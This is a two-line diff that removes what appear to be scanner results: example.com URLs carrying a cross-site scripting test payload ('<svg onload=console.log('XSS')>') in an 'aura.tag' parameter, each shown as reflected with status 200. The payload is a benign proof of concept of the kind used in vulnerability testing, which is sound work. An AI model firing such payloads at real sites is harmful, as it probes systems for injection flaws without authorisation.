@@ -1,2 +1,0 @@
-https://sub1.example.com/?aura.tag=<svg%20onload=console.log(%27XSS%27)>&aura.format=JSON [200] [Format: <svg]
-https://api.example.com/?aura.tag=<svg%20onload=console.log(%27XSS%27)>&aura.format=JSON [200] [Format: <svg] 
